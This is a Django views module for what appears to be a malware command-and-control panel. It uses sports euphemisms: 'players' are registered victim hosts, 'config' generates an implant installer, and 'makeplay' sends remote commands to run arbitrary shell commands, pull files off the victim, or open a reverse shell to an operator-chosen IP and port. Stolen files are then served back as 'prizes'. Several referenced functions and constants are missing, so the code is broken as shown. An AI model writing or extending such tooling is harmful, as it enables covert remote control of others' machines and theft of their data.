import ipaddress
import os
import socket

from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, HttpResponseNotFound, HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.utils import timezone
from django.views.decorators.http import require_GET, require_POST, require_http_methods

from blanko.controller.commands import cmd_exec, cmd_get, cmd_ping, cmd_shell

from .models import BlankoPlay, BlankoPlayer

from .utils import available_kernels, configure_blanko_installer
# from .utils import get_prize, new_prize


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def index(request):
    lineup = BlankoPlayer.objects.order_by("hostname")
    return render(
        request, "blanko/index.html", {"lineup": lineup}
    )


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def stats(request, player_id):
    player = get_object_or_404(BlankoPlayer, pk=player_id)
    return render(
        request,
        "blanko/stats.html",
        {
            "player": player,
            "plays": player.blankoplay_set.order_by("-play_time"),
        },
    )


@require_http_methods(["GET", "POST"])
@login_required(login_url="/signin/", redirect_field_name=None)
def hire(request):
    template_data = {
        "hostname": "",
        "address": "",
        "kernel": "",
        "kernel_vers": available_kernels(),
    }
    if request.method == "GET":
        return render(request, "blanko/hire.html", template_data)
    try:
        hostname = request.POST["hostname"]
        address = request.POST["address"]
        kernel = request.POST["kernel"]
    except KeyError:
        return render(request, "blanko/hire.html")
    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
        
    if not all((hostname, address, kernel)):
        template_data["error_msg"] = "Missing configuration data!"
        return render(request, "blanko/hire.html", template_data, status=400)
    try:
        player = BlankoPlayer.objects.create(
            hostname=hostname, address=address, kernel=kernel, birthday=timezone.now()
        )
        return HttpResponseRedirect(reverse("blankoindex"))
    except:
        template_data["error_msg"] = "Configuration failed!"
        return render(request, "blanko/hire.html", template_data, status=500)


@require_http_methods(["GET", "POST"])
@login_required(login_url="/signin/", redirect_field_name=None)
def config(request):
    template_data = {
        "user_path": "",
        "kernel": "",
        "kernel_vers": available_kernels(),
    }
    if request.method == "GET":
        return render(request, "blanko/config.html", template_data)
    try:
        user_path = request.POST["user_path"]
        kernel = request.POST["kernel"]
    except KeyError:
        return render(request, "blanko/config.html")
    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
        
    if not all((user_path, kernel)):
        template_data["fail_msg"] = "Missing configuration data!"
        return render(request, "blanko/config.html", template_data, status=400)

    try:
        installer = configure_blanko_installer(
            kernel_ver=kernel,
            exe_path=user_path,
        )
        response = HttpResponse(installer, content_type="application/octet-stream")
        response["Content-Disposition"] = f"inline; filename=blanko-installer"
        return response
    except Exception as e:
        template_data["fail_msg"] = str(e)
        return render(request, "blanko/config.html", template_data, status=500)


@require_POST
@login_required(login_url="/signin/", redirect_field_name=None)
def fire(request, player_id):
    player = get_object_or_404(BlankoPlayer, pk=player_id)
    player.delete()
    return HttpResponseRedirect(reverse("blankoindex"))


@require_http_methods(["GET", "POST"])
@login_required(login_url="/signin/", redirect_field_name=None)
def makeplay(request, player_id):
    player = get_object_or_404(BlankoPlayer, pk=player_id)
    play_time = timezone.now()
    try:
        play_verb = request.POST["play"]
        detail = request.POST["detail"]
        dest_port = int(request.POST["slamport"])
        listen_port = int(request.POST["jamport"])
        if play_verb == "PING" and detail != "":
            raise ValueError("PING does not except additional detail")
        if play_verb in ("GET", "EXEC", "SHELL") and detail == "":
            raise ValueError(f"detail is required for {play_verb}")
    except Exception as err:
        return render(
            request,
            "blanko/stats.html",
            {
                "player": player,
                "plays": player.blankoplay_set.order_by("-play_time"),
                "error_msg": repr(err),
            },
            status=400,
        )
    play = BlankoPlay(
        player=player, play_time=play_time, verb=play_verb, detail=detail, scored=False
    )
    try:
        if play_verb == "PING":
            cmd_ping(dest_ip=player.address, dest_port=dest_port, listen_port=listen_port)
        elif play_verb == "EXEC":
            retcode, output = cmd_exec(
                dest_ip=player.address, dest_port=dest_port, listen_port=listen_port, cmd=detail
            )
            if retcode != 0:
                play.penalty = str(retcode)
            if len(output.strip()):
                dest, uri = new_prize("stdout.txt")
                with open(dest, "w") as f:
                    f.write(output)
                play.filepath = uri
        elif play_verb == "GET":
            dest, uri = new_prize(os.path.basename(detail))
            do_get(player.address, dest_port, listen_port, detail, dest)
            play.filepath = uri
        elif play_verb == "SHELL":
            ip, port = detail.rsplit(":")
            ip = ipaddress.IPv4Address(ip)
            port = int(port)
            cmd_shell(
                dest_ip=player.address, dest_port=dest_port, listen_port=listen_port, shell_ip=ip, shell_port=port
            )
    except (ConnectionError, ValueError, socket.gaierror) as err:
        play.penalty = repr(err)
        player.active = False
    except Exception as err:
        play.penalty = repr(err)
    else:
        player.active = True
        play.scored = True
    play.save()
    player.save()
    return HttpResponseRedirect(reverse("stats", args=(player_id,)))


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def prize(request, prize_id):
    try:
        path = get_prize(str(prize_id))
        filename = os.path.basename(path)
        with open(path, "rb") as f:
            file_data = f.read()
        if filename.endswith(".txt") or filename in TREAT_AS_TXT_FILES:
            content_type = "text/plain"
        else:
            content_type = "application/octet-stream"
        response = HttpResponse(file_data, content_type=content_type)
        response["Content-Disposition"] = f"inline; filename={filename}"
        return response
    except Exception as err:
        return HttpResponseNotFound()
